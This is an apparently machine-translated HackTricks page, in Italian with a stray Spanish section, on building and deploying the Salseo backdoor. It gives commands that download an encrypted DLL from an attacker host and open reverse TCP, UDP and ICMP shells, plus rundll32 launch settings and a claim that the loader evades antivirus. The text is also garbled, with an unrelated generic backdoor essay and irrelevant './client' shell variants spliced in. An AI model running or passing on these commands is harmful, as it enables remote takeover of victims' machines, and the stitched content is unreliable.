# Salseo

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Compilazione dei binari

Scarica il codice sorgente da github e compila **EvilSalsa** e **SalseoLoader**. Avrai bisogno di **Visual Studio** installato per compilare il codice.

Compila questi progetti per l'architettura della finestra di Windows in cui li utilizzerai (se Windows supporta x64, compilali per quella architettura).

Puoi **selezionare l'architettura** all'interno di Visual Studio nella **scheda "Build" a sinistra** in **"Platform Target".**

(\*\*Se non riesci a trovare queste opzioni, premi su **"Project Tab"** e poi su **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Quindi, compila entrambi i progetti (Build -> Build Solution) (Nei log apparirà il percorso dell'eseguibile):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Prepara la backdoor

Prima di tutto, dovrai codificare il **EvilSalsa.dll.** Per farlo, puoi utilizzare lo script python **encrypterassembly.py** o puoi compilare il progetto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

#### Salseo

##### Salseo - Backdoor

Un backdoor es una forma de acceso no autorizado a un sistema o aplicación que permite a un atacante evadir los mecanismos de seguridad y obtener control remoto sobre el sistema comprometido. El backdoor puede ser instalado de manera oculta y puede permitir al atacante ejecutar comandos, robar información o realizar otras acciones maliciosas sin ser detectado.

##### Salseo - Tipos de Backdoors

Existen diferentes tipos de backdoors que pueden ser utilizados en sistemas Windows:

- **Backdoors de puerta trasera**: Estos backdoors son programas o scripts que se instalan en el sistema y permiten al atacante acceder al sistema comprometido de forma remota. Pueden ser instalados de manera oculta y pueden proporcionar al atacante un control total sobre el sistema.

- **Backdoors de shell inverso**: Estos backdoors permiten al atacante establecer una conexión remota con el sistema comprometido a través de un shell inverso. El atacante puede ejecutar comandos en el sistema y recibir la salida de los comandos de forma remota.

- **Backdoors de persistencia**: Estos backdoors se instalan en el sistema comprometido de manera que se ejecuten automáticamente cada vez que el sistema se inicie. Esto permite al atacante mantener el acceso al sistema de forma persistente.

##### Salseo - Técnicas de Backdooring

Existen varias técnicas que pueden ser utilizadas para instalar un backdoor en un sistema Windows:

- **Explotación de vulnerabilidades**: Los atacantes pueden aprovechar las vulnerabilidades presentes en el sistema o en las aplicaciones instaladas para instalar un backdoor. Esto puede incluir la explotación de vulnerabilidades de día cero, que son vulnerabilidades desconocidas para el fabricante y para las cuales no existe un parche disponible.

- **Ingeniería social**: Los atacantes pueden utilizar técnicas de ingeniería social para engañar a los usuarios y hacer que instalen un backdoor de forma voluntaria. Esto puede incluir el envío de correos electrónicos de phishing, la creación de sitios web falsos o la distribución de archivos maliciosos disfrazados como archivos legítimos.

- **Uso de herramientas de hacking**: Los atacantes pueden utilizar herramientas de hacking específicas para instalar un backdoor en un sistema Windows. Estas herramientas pueden incluir exploits, kits de herramientas de hacking o malware diseñado específicamente para instalar backdoors.

##### Salseo - Detección y Prevención de Backdoors

La detección y prevención de backdoors en sistemas Windows puede ser un desafío, ya que los backdoors están diseñados para ser sigilosos y evadir los mecanismos de seguridad. Sin embargo, existen algunas medidas que se pueden tomar para detectar y prevenir los backdoors:

- **Mantener el sistema actualizado**: Mantener el sistema operativo y las aplicaciones instaladas actualizadas con los últimos parches de seguridad puede ayudar a prevenir la explotación de vulnerabilidades conocidas.

- **Utilizar software de seguridad**: Utilizar software de seguridad, como antivirus y firewalls, puede ayudar a detectar y bloquear la instalación de backdoors.

- **Realizar análisis de seguridad regulares**: Realizar análisis de seguridad regulares en el sistema puede ayudar a detectar la presencia de backdoors. Esto puede incluir el uso de herramientas de escaneo de vulnerabilidades y análisis de malware.

- **Educación y concienciación del usuario**: Educar a los usuarios sobre las técnicas de ingeniería social y los riesgos de instalar software desconocido puede ayudar a prevenir la instalación de backdoors de forma voluntaria.

- **Monitorizar el tráfico de red**: Monitorizar el tráfico de red puede ayudar a detectar la comunicación de un backdoor con el atacante. Esto puede incluir el uso de herramientas de monitorización de red y análisis de registros de eventos.

- **Realizar auditorías de seguridad**: Realizar auditorías de seguridad regulares en el sistema puede ayudar a identificar y corregir posibles vulnerabilidades que podrían ser explotadas para instalar backdoors.

##### Salseo - Eliminación de Backdoors

Si se detecta la presencia de un backdoor en un sistema Windows, es importante tomar medidas para eliminarlo y asegurar el sistema. Algunas medidas que se pueden tomar incluyen:

- **Desconectar el sistema de la red**: Desconectar el sistema de la red puede ayudar a prevenir la comunicación del backdoor con el atacante y evitar que se realicen acciones maliciosas adicionales.

- **Escanear y limpiar el sistema**: Utilizar herramientas de escaneo de malware y antivirus para buscar y eliminar el backdoor del sistema.

- **Restaurar desde una copia de seguridad**: Si se dispone de una copia de seguridad del sistema antes de la infección, se puede restaurar el sistema desde esa copia para eliminar el backdoor.

- **Cambiar contraseñas**: Cambiar las contraseñas de las cuentas comprometidas puede ayudar a prevenir el acceso no autorizado al sistema.

- **Reforzar la seguridad del sistema**: Tomar medidas adicionales para reforzar la seguridad del sistema, como actualizar contraseñas, habilitar la autenticación de dos factores y restringir los permisos de usuario.

- **Investigar la causa**: Investigar la causa de la infección del backdoor puede ayudar a identificar las vulnerabilidades o las técnicas utilizadas por el atacante, lo que puede ayudar a prevenir futuras infecciones.

##### Salseo - Conclusión

Los backdoors son una amenaza seria para la seguridad de los sistemas Windows, ya que permiten a los atacantes obtener acceso no autorizado y control remoto sobre un sistema comprometido. La detección y prevención de backdoors puede ser un desafío, pero tomando medidas como mantener el sistema actualizado, utilizar software de seguridad y realizar análisis de seguridad regulares, se puede reducir el riesgo de infección. Si se detecta la presencia de un backdoor, es importante tomar medidas para eliminarlo y asegurar el sistema.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, ora hai tutto il necessario per eseguire tutto il procedimento di Salseo: il **file EvilDalsa.dll codificato** e il **binario di SalseoLoader**.

**Carica il binario SalseoLoader.exe sulla macchina. Non dovrebbe essere rilevato da nessun antivirus...**

## **Esegui la backdoor**

### **Ottenere una shell inversa TCP (scaricando la dll codificata tramite HTTP)**

Ricorda di avviare un nc come listener per la shell inversa e un server HTTP per servire il file evilsalsa codificato.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Ottenere una shell inversa UDP (scaricando una dll codificata tramite SMB)**

Ricorda di avviare un nc come listener per la shell inversa e un server SMB per servire l'evilsalsa codificato (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Ottenere una shell inversa ICMP (dll codificata già presente nella vittima)**

**Questa volta è necessario uno strumento speciale nel client per ricevere la shell inversa. Scarica:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Disabilita le risposte ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Esegui il client:

```bash
./client
```

#### Execute the client with arguments:

```bash
./client arg1 arg2
```

#### Execute the client in the background:

```bash
./client &
```

#### Execute the client and redirect output to a file:

```bash
./client > output.txt
```

#### Execute the client and append output to a file:

```bash
./client >> output.txt
```

#### Execute the client and send output to /dev/null:

```bash
./client > /dev/null
```

#### Execute the client and send output and errors to /dev/null:

```bash
./client > /dev/null 2>&1
```

#### Execute the client and run a command after it finishes:

```bash
./client ; echo "Command executed"
```

#### Execute the client and run a command only if it succeeds:

```bash
./client && echo "Command executed"
```

#### Execute the client and run a command only if it fails:

```bash
./client || echo "Command executed"
```
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### All'interno della vittima, eseguiamo la cosa del salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilazione di SalseoLoader come DLL esportando la funzione principale

Apri il progetto SalseoLoader utilizzando Visual Studio.

### Aggiungi prima della funzione principale: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Installa DllExport per questo progetto

#### **Strumenti** --> **Gestione pacchetti NuGet** --> **Gestisci pacchetti NuGet per la soluzione...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Cerca il pacchetto DllExport (utilizzando la scheda Sfoglia) e premi Installa (e accetta il popup)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Nella cartella del tuo progetto sono apparsi i file: **DllExport.bat** e **DllExport\_Configure.bat**

### **Disinstalla DllExport**

Premi **Disinstalla** (sì, è strano ma fidati, è necessario)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Esci da Visual Studio ed esegui DllExport\_configure**

Semplicemente **esci** da Visual Studio

Quindi, vai nella tua cartella **SalseoLoader** ed **esegui DllExport\_Configure.bat**

Seleziona **x64** (se lo utilizzerai all'interno di una macchina x64, come nel mio caso), seleziona **System.Runtime.InteropServices** (all'interno di **Namespace per DllExport**) e premi **Applica**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Apri nuovamente il progetto con Visual Studio**

**\[DllExport]** non dovrebbe più essere segnato come errore

![](<../.gitbook/assets/image (8) (1).png>)

### Compila la soluzione

Seleziona **Tipo di output = Libreria di classi** (Progetto --> Proprietà SalseoLoader --> Applicazione --> Tipo di output = Libreria di classi)

![](<../.gitbook/assets/image (10) (1).png>)

Seleziona **piattaforma x64** (Progetto --> Proprietà SalseoLoader --> Compila --> Destinazione della piattaforma = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Per **compilare** la soluzione: Compila --> Compila soluzione (Nella console di output verrà visualizzato il percorso della nuova DLL)

### Testa la DLL generata

Copia e incolla la DLL dove vuoi testarla.

Esegui:
```
rundll32.exe SalseoLoader.dll,main
```
Se non appare alcun errore, probabilmente hai una DLL funzionante!!

## Ottieni una shell utilizzando la DLL

Non dimenticare di utilizzare un **server** **HTTP** e impostare un **listener nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) è un interprete di comandi per i sistemi operativi Windows. È uno strumento potente che consente agli utenti di interagire con il sistema operativo tramite comandi testuali. CMD può essere utilizzato per eseguire una varietà di operazioni, come l'esecuzione di programmi, la gestione dei file e delle cartelle, la configurazione delle impostazioni di rete e molto altro ancora. È uno strumento essenziale per i professionisti dell'hacking, in quanto consente loro di eseguire comandi personalizzati per ottenere accesso e controllo sui sistemi target.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
